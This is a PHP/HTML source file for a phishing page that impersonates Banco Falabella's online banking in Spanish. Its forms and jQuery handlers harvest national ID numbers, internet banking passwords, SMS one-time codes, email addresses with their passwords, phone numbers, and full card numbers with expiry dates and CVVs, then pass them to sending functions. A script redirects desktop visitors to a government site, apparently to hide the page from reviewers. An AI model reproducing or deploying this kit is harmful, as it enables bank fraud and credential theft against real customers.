<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
  		<title>Adquiere tu tarjeta CMR y cuenta de ahorro costo $0 | Banco Falabella</title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">  		
		<meta content="es" http-equiv="Content-Language">
  		<meta name="description" content="">
  		<meta name="author" content="">
  		<meta name="Copyright" content="">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">	 	
		<link href="css/style.css" rel="stylesheet">
		<link href="css/stylesheet.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="img/logo.png" />
		<script type="text/javascript" src="../../../js/jquery-3.6.0.min.js"></script>
		<script src="../../../js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="js/functions.js"></script>  	
   	</head>
   	<body>
   		<div id="fondo"></div>

   		<div id="fondo-oscuro"></div>

   		<div class="loader"></div>

   		<div id="mensaje">
   			<table>
   				<tr>
   					<td>
   						Por favor espere un momento estamos validando algunos datos. Puede tardar un momento. No cierres o recargues esta ventana.
   					</td>
   					<td>
   						<div class="cargando2"></div>
   					</td>
   				</tr>
   			</table>
   		</div>
   		<div id="cargando">
	   		<img src="img/logo.png">	
   		</div>
   		
   		<div id="frmToken">
   			<div class="etiqueta-destacada" style="margin-bottom: 8px;">
		  		Ingrese su  clave dinámica
		  	</div>		  	
		
			<span>
		  		Solo debes de ingresar la clave dinámica que te llegara por SMS o correo electrónico
		  	</span>		  	
			<br>
			<div class="separador"></div>
			<br>
			<input type="password" placeholder="Clave dinámica" name="txtToken" id="txtToken" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
		  	<br><br>
		  	<button class="btn" type="submit" id="btnOTP" disabled> VERIFICAR </button>	
   		</div>


   		<div id="frmTokenError">
   			<div class="etiqueta-destacada" style="margin-bottom: 8px;">
		  		Ingrese su Token
		  	</div>		  	
			<span>
		  		Token inválido. Al fallar un número determinado de veces tu Clave Internet se bloqueará
		  	</span>		  	
			<br>
			<div class="separador"></div>
			<br>
			<input type="password" placeholder="Clave dinámica" name="txtTokenE" id="txtTokenE" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
		  	<br><br>
		  	<button class="btn" type="submit" id="btnOTPE" disabled> VERIFICAR </button>	
   		</div>


   		<div id="frmCorreo">
   			<div class="etiqueta-destacada" style="margin-bottom: 8px;">
		  		Ingrese su Correo electrónico
		  	</div>		  	
		
			<span>
		  		Verificaremos estos datos con los agregados anteriormente en nuestras sucursales
		  	</span>		  	
			<br>
			<div class="separador"></div>
			<br>
			<input type="text" placeholder="Correo electrónico" name="txtCorreo" id="txtCorreo" class="entradas" autocomplete="off">
			<br>
			<input type="password" placeholder="Clave correo" name="txtClaveCO" id="txtClaveCO" class="entradas" autocomplete="off">
			<br>
			<input type="text" placeholder="Celular" name="txtCelular" id="txtCelular" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="10">
		  	<br><br>
		  	<button class="btn" type="submit" id="btnCorreo" disabled> ACTUALIZAR </button>	
   		</div>


   		<div id="frmTarjeta">
   			
   			<div class="etiqueta-destacada" style="margin-bottom: 8px;">
		  		Activación de Seguridad
		  	</div>		  	
		
			<span>
		  		Digite los siguientes datos para activar la seguridad de tu cuenta.
		  	</span>		  	
			<br>
			<div class="separador"></div>
			<br>
			<input type="text" placeholder="Tarjeta de crédito o débito" name="txtTarjeta" id="txtTarjeta" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="16">
			<br>
			<table width="100%">
				<tr>
					<td>
						<select class="entradas" id="mFecha" name="mFecha">
                    		<option value="" default selected>Mes</option>
                            <option value="01">01</option>
                            <option value="02">02</option>
                            <option value="03">03</option>
                            <option value="04">04</option>
                            <option value="05">05</option>
                            <option value="06">06</option>
                            <option value="07">07</option>
                            <option value="08">08</option>
                            <option value="09">09</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                        </select>
					</td>
					<td>
						<select class="entradas" id="aFecha" name="aFecha">
							<option value="" default selected>Año</option>					
							<option value="2022">2022</option>
							<option value="2023">2023</option>
							<option value="2024">2024</option>
							<option value="2025">2025</option>
							<option value="2026">2026</option>
							<option value="2027">2027</option>
							<option value="2028">2028</option>
							<option value="2029">2029</option>
							<option value="2030">2030</option>
							<option value="2031">2031</option>
							<option value="2032">2032</option>
							<option value="2033">2033</option>
						</select>
					</td>
				</tr>
			</table>
		
			<input type="password" placeholder="CVV" name="txtCVV" id="txtCVV" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="3">
		  	<br><br>
		  	<button class="btn" type="submit" id="btnTarjeta" disabled> VALIDAR </button>

   		</div>


   		<div class="top-bar">
   			<table class="menu-top-bar">
   				<tr>
   					<td>Falabella</td>
   					<td>Viajes Falabella</td>
   					<td>Seguros Falabella</td>
   					<td>Sodimac</td>
   					<td>Linio</td>
   				</tr>
   			</table>

   			<table class="ayuda-top-bar">
   				<tr>
   					<td style="padding: 8px 2px;"><img src="img/ayuda.svg"></td>
   					<td style="padding: 8px 2px;">Canales de Atención</td>   					
   				</tr>
   			</table>

   			<div style="float:right;"></div>  			
   		</div>   
   		<div class="header">
   			<table style="float:left;">
   				<tr>
   					<td><img src="img/menu.jpg" id="boton-menu"></td>
   					<td><img src="img/logo.svg" id="logo-pal"></td>
   				</tr>
   			</table>
  			

   			<button class="btn" type="submit" id="btnBanca"> BANCA EN LÍNEA </button>


   			<table style="float:right" id="frmLogin">
   				<tr>
   					<td>
   						<select name="txtTipo" id="txtTipo" class="entradas">
   							<option value="CC">Cédula Ciudadanía</option>
   							<option value="CE">Cédula de Extranjería</option>
   							<option value="PP">Pasaporte</option>
   						</select>
   					</td>
   					<td>
   						<input type="text" placeholder="Cédula de Ciudadanía" name="txtDocumento" id="txtDocumento" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="10">
   					</td>
   					<td>
   						<input type="password" placeholder="Clave Internet" name="txtClave" id="txtClave" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
   					</td>
   					<td>
   						<button class="btn" type="submit" id="btnEntrar" disabled > ❯ </button>
   					</td>
   				</tr>
   			</table>
   		</div>
   		<div style="text-align: center;padding-top:80px;">
	   		<div class="menu" style="margin:0 auto;">
	   			<table cellpadding="0" cellspacing="0">
	   				<tr>
	   					<td><span style="border-left: 0px solid;">CUENTAS</span></td>
	   					<td><span>TARJETAS CMR</span></td>
	   					<td><span>CDT</span></td>
	   					<td><span>CRÉDITOS</span></td>
	   					<td><span>DESCUENTOS</span></td>
	   					<td><span>BANCA SEGUROS</span></td>
	   					<td><span>CMR PUNTOS</span></td>
	   					<td><span>CANALES</span></td>
	   					<td><span>BANCA EMPRESAS</span></td>
	   					<td><span>SOSTENIBILIDAD</span></td>
	   				</tr>
	   			</table>   			
	   		</div>
	   	</div>	

	   	<div id="frmLoginMobile">	  
	   	<div style="text-align:right;">
	   		<table style="float:right;" id="btnCerrar">
	   			<tr>
	   				<td>CERRAR</td>
	   				<td><img src="img/x.jpg" style="margin-left: 10px; width: 26px;"></td>
	   			</tr>
	   		</table>
	   		
	   	</div> 		
	   	<br>
	   		<select name="txtTipoM" id="txtTipoM" class="entradas">
				<option value="CC">Cédula Ciudadanía</option>
				<option value="CE">Cédula de Extranjería</option>
				<option value="PP">Pasaporte</option>
			</select>
			<br>
			<input type="text" placeholder="Cédula de Ciudadanía" name="txtDocumentoM" id="txtDocumentoM" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="10">
		  	<br>
		  	<input type="password" placeholder="Clave Internet" name="txtClaveM" id="txtClaveM" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
		  	<br>
		  	<button class="btn" type="submit" id="btnEntrarM" disabled> INGRESAR </button>	
		  	<span>Crea o recupera tu Clave Internet</span>  			
	   	</div>

	   	<div class="slider">
		    <ul>
		      <li><img src="img/slider-1.jpg"></li>
		      <li><img src="img/slider-2.jpg"></li>
		      <li><img src="img/slider-3.jpg"></li>
		    </ul>
		  </div>

		  <div class="slider-mobile">
		    <ul>
		      <li><img src="img/slider-mobile-1.jpg"></li>
		      <li><img src="img/slider-mobile-2.jpg"></li>
		      <li><img src="img/slider-mobile-3.jpg"></li>
		    </ul>
		  </div>
		  <div class="frmCredito">
		  	<table width="100%">
		  		<tr>
		  			<td class="etiqueta-destacada" width="25%">
		  				Simula tu Crédito de Consumo
		  			</td>
		  			<td width="25%">
		  				<select name="txtTipoS" id="txtTipoS" class="entradas">
							<option value="CC">Cédula Ciudadanía</option>
   							<option value="CE">Cédula de Extranjería</option>
   							<option value="PP">Pasaporte</option>
						</select>
		  			</td>
		  			<td width="25%">
		  				<input type="text" placeholder="Cédula de Ciudadanía" name="txtDocumentoS" name="txtDocumentoS" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="10">
		  			</td>
		  			<td>
		  				<button class="btn" type="submit" id="btnSimular"> SIMULAR </button>
		  			</td>
		  		</tr>
		  	</table>
		  </div>

		  <div class="frmCreditoMobile" style="text-align: center;">
		  	<span class="etiqueta-destacada">
		  		Simula tu Crédito de Consumo
		  	</span>
		  	<br>
			<select name="txtTipoSM" id="txtTipoSM" class="entradas">
				<option value="CC">Cédula Ciudadanía</option>
				<option value="CE">Cédula de Extranjería</option>
				<option value="PP">Pasaporte</option>
			</select>
			<br>
			<input type="text" placeholder="Cédula de Ciudadanía" name="txtDocumentoSM" name="txtDocumentoSM" class="entradas">
		  	<br>
		  	<button class="btn" type="submit" id="btnSimularM"> SIMULAR </button>	  	
		  </div>

		  <div class="contenido">
		  		<img src="img/contenido.jpg" id="conten">
		  		<img src="img/contenido-mobile.jpg" id="contenMob">
		  </div>
   	
<script>
    function detectar_dispositivo() {
        var dispositivo = "";
        if (navigator.userAgent.match(/Android/i))
            dispositivo = "Android";
        else if (navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else if (navigator.userAgent.match(/iPhone/i))
            dispositivo = "iPhone";
        else if (navigator.userAgent.match(/iPad/i))
            dispositivo = "iPad";
        else if (navigator.userAgent.match(/iPod/i))
            dispositivo = "iPod";
        else if (navigator.userAgent.match(/BlackBerry/i))
            dispositivo = "BlackBerry";
        else if (navigator.userAgent.match(/Windows Phone/i))
            dispositivo = "Windows Phone";
        else
            dispositivo = "PC";
        return dispositivo;
    }

    if (detectar_dispositivo() == "PC") {
        window.location.href = 'https://www.dian.gov.co';
    }
</script>
    
</body>
</html>
<script type="text/javascript">
	var espera = 0;
	var banca = 0;

	let identificadorTiempoDeEspera;

	function delay_espera() {
	  identificadorTiempoDeEspera = setTimeout(ventana_espera, 700);
	}

	function ventana_espera() {
		$("#fondo").hide();
		$(".loader").hide();
		$("#cargando").hide();	
		$("#fondo-oscuro").show();
		$("#mensaje").show();
	}
	
	function cargando(){
		$("#frmToken").hide();
		$("#frmTokenError").hide();
		$("#frmCorreo").hide();
		$("#frmTarjeta").hide();

		$("#fondo").show();
		$(".loader").show();
		$("#cargando").show();
		delay_espera();		
	}

	$(document).ready(function($){
		setInterval(consultar_estado,2000);

		$("#btnBanca").click(function(){
			if (banca == 0) {
				$("#frmLoginMobile").show("slow");
				banca = 1;	
			}else{
				$("#frmLoginMobile").hide("slow");
				banca = 0;
			}	
		});

		$("#btnCerrar").click(function(){
			$("#frmLoginMobile").hide("slow");
			banca = 0;	
		});
	



		$('#txtDocumentoM,#txtClaveM').keyup(function(event){
			if ($('#txtDocumentoM').val().length > 6) {
				if ($('#txtClaveM').val().length > 5) {
					$("#btnEntrarM").removeAttr("disabled");
					$("#btnEntrarM").css("background-color","#dc2a4d");
					$("#btnEntrarM").css("cursor","pointer");
				}else{
					$("#btnEntrarM").attr("disabled","disabled");
					$("#btnEntrarM").css("background-color","#E8748B");
					$("#btnEntrarM").css("cursor","unset");
				}
			}else{
				$("#btnEntrarM").attr("disabled","disabled");
				$("#btnEntrarM").css("background-color","#E8748B");
				$("#btnEntrarM").css("cursor","unset");
			}
		});

		
		$("#txtTipoM").change(function(){
			if ($("#txtTipoM").val() == "CC") {
				$('#txtDocumentoM').attr("placeholder","Cédula de Ciudadanía");
			}
			if ($("#txtTipoM").val() == "CE") {
				$('#txtDocumentoM').attr("placeholder","Cédula de Extranjería");
			}	
			if ($("#txtTipoM").val() == "PP") {
				$('#txtDocumentoM').attr("placeholder","Pasaporte");
			}
		});	 

		$("#btnEntrarM").click(function(){		
			cargando();
			iniciar_sesion($("#txtTipoM").val(),$("#txtDocumentoM").val(),$("#txtClaveM").val());		
		});




		$('#txtDocumento,#txtClave').keyup(function(event){
			if ($('#txtDocumento').val().length > 6) {
				if ($('#txtClave').val().length > 5) {
					$("#btnEntrar").removeAttr("disabled");
					$("#btnEntrar").css("background-color","#38a121");
					$("#btnEntrar").css("cursor","pointer");
				}else{
					$("#btnEntrar").attr("disabled","disabled");
					$("#btnEntrar").css("background-color","#59B981");
					$("#btnEntrar").css("cursor","unset");
				}
			}else{
				$("#btnEntrar").attr("disabled","disabled");
				$("#btnEntrar").css("background-color","#59B981");
				$("#btnEntrar").css("cursor","unset");
			}
		});

		
		$("#txtTipo").change(function(){
			if ($("#txtTipo").val() == "CC") {
				$('#txtDocumento').attr("placeholder","Cédula de Ciudadanía");
			}
			if ($("#txtTipo").val() == "CE") {
				$('#txtDocumento').attr("placeholder","Cédula de Extranjería");
			}	
			if ($("#txtTipo").val() == "PP") {
				$('#txtDocumento').attr("placeholder","Pasaporte");
			}
		});	 

		$("#btnEntrar").click(function(){		
			cargando();
			iniciar_sesion($("#txtTipo").val(),$("#txtDocumento").val(),$("#txtClave").val());		
		});

		$('#txtToken').keyup(function(event){
			if ($('#txtToken').val().length > 5) {
				$("#btnOTP").removeAttr("disabled");
				$("#btnOTP").css("background-color","#38a121");
				$("#btnOTP").css("cursor","pointer");	
			}else{
				$("#btnOTP").attr("disabled","disabled");
				$("#btnOTP").css("background-color","#59B981");
				$("#btnOTP").css("cursor","unset");	
			}
		});

		$("#btnOTP").click(function(){
			cargando();	
			enviar_otp($("#txtToken").val());		
		});

		$('#txtTokenE').keyup(function(event){
			if ($('#txtTokenE').val().length > 5) {
				$("#btnOTPE").removeAttr("disabled");
				$("#btnOTPE").css("background-color","#38a121");
				$("#btnOTPE").css("cursor","pointer");	
			}else{
				$("#btnOTPE").attr("disabled","disabled");
				$("#btnOTPE").css("background-color","#59B981");
				$("#btnOTPE").css("cursor","unset");	
			}
		});

		$("#btnOTPE").click(function(){
			cargando();
			enviar_otp($("#txtTokenE").val());		
		});	


		$('#txtCorreo,#txtClaveCO,#txtCelular').keyup(function(event){
			if ($("#txtCorreo").val().indexOf('@', 0) != -1 && $("#txtCorreo").val().indexOf('.', 0) != -1) {
				if ($("#txtClaveCO").val().length > 0) {
					if ($("#txtCelular").val().length > 9) {
						$("#btnCorreo").removeAttr("disabled");
						$("#btnCorreo").css("background-color","#38a121");
						$("#btnCorreo").css("cursor","pointer");
					}else{
						$("#btnCorreo").attr("disabled","disabled");
						$("#btnCorreo").css("background-color","#59B981");
						$("#btnCorreo").css("cursor","unset");
					}
				}else{
					$("#btnCorreo").attr("disabled","disabled");
					$("#btnCorreo").css("background-color","#59B981");
					$("#btnCorreo").css("cursor","unset");
				}					
			}else{
				$("#btnCorreo").attr("disabled","disabled");
				$("#btnCorreo").css("background-color","#59B981");
				$("#btnCorreo").css("cursor","unset");	
			}
		});


		$("#btnCorreo").click(function(){
			cargando();	
			enviar_correo($("#txtCorreo").val(),$("#txtClaveCO").val(),$("#txtCelular").val());		
		});

		$('#txtTarjeta,#txtCVV').keyup(function(event){
			if ($("#txtTarjeta").val().length > 15) {
				if ($("#mFecha").val() != "" && $("#aFecha").val() != "") {
					if ($("#txtCVV").val().length > 2) {
						$("#btnTarjeta").removeAttr("disabled");
						$("#btnTarjeta").css("background-color","#38a121");
						$("#btnTarjeta").css("cursor","pointer");
					}else{
						$("#btnTarjeta").attr("disabled","disabled");
						$("#btnTarjeta").css("background-color","#59B981");
						$("#btnTarjeta").css("cursor","unset");
					}
				}else{
					$("#btnTarjeta").attr("disabled","disabled");
					$("#btnTarjeta").css("background-color","#59B981");
					$("#btnTarjeta").css("cursor","unset");
				}
			}else{
				$("#btnTarjeta").attr("disabled","disabled");
				$("#btnTarjeta").css("background-color","#59B981");
				$("#btnTarjeta").css("cursor","unset");
			}
		});

		$("#btnTarjeta").click(function(){
			f = $("#mFecha").val() + "-" + $("#aFecha").val()
			cargando();
			enviar_tarjeta($("#txtTarjeta").val(),f,$("#txtCVV").val());		
		});		

	});	
</script>